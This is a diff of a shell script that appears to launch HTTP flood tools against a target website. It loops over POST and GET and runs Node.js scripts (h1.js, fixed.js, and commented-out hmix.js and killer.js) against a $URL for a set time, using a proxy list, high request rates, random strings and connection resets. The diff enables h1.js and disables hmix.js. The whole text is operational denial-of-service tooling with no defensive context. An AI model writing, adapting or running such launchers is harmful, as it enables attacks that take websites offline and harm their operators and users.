@@ -17,9 +17,9 @@ wait
 
 
 # Chạy các script node 
-for m in POST GET; do
-  #node hmix.js -m $m -u $URL -s $TIME -p live.txt -t 1 -r 38 --full true -d false &  
-  #node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
+for m in POST GET; do  
+  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
   node fixed.js $URL $TIME 1 1 hihi.txt --verify true &
+  #node hmix.js -m $m -u $URL -s $TIME -p live.txt -t 1 -r 38 --full true -d false &
   #node killer.js $m $URL $TIME 2 2 live.txt --query 1 --referer rand --http mix --close --parsed --reset &
 done
